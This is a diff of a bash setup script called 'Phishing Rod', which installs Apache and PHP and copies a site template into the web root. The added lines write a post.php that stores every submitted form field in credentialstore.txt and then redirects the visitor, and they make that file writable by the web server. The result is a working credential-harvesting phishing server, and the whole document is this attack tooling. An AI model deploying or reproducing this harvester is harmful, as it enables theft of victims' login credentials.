@@ -2,6 +2,7 @@
 
 #PHISHING ROD
 #Written By 4chtung
+#Version V0.1 Alpha
 
 # HOLY CRAP COLOUR!
 ESC="\e["
@@ -43,8 +44,10 @@ fancyintro
 ## CHECK FOR ROOT ACCESS
 
 if (( $EUID != 0 )); then
-    echo -e "${RED}ERROR!!! -- YOU ARE NOT ROOT! -- ERROR!!!${RESET}"
-    echo -e "${RED}  PLEASE RUN AS ROOT!${RESET}"
+    echo -e "${RED}ERROR!!!----YOU ARE NOT ROOT!----ERROR!!!${RESET}"
+    echo -e "${RED}-----------PLEASE RUN AS ROOT!-----------${RESET}"
+    echo -e "${RED}--OR SUDO OR WHATEVER I'M NOT YOUR MUM!--${RESET}"
+    echo -e "${RED}ERROR!!!----YOU ARE NOT ROOT!----ERROR!!!${RESET}"
     echo
     exit
 fi
@@ -53,11 +56,21 @@ fi
 
 apt-get update
 
-## INSTALL APACHE2
-apt-get install apache2 -y
+## INSTALL APACHE2 / PHP / ANYTHING ELSE WE NEED
+apt-get install php libapache2-mod-php apache2 -y
 
-## INSTALL PHP
-apt-get install php libapache2-mod-php -y
+## For Good Measure, Restart APACHE2
+service apache2 restart
 
 ## Install Site Template to Apache Folder
-cp site/* /var/www/html/
+cp -R site/* /var/www/html/
+
+## Create post.php
+echo "<?php $file = 'credentialstore.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?>" > /var/www/html/post.php
+echo '<meta http-equiv="refresh" content="0; url=./Redirect.html" />' >> /var/www/html/post.php
+
+## Create Credential File
+touch /var/www/html/credentialstore.txt
+
+## Give www-data access to the file.
+chown www-data /var/www/html/credentialstore.txt
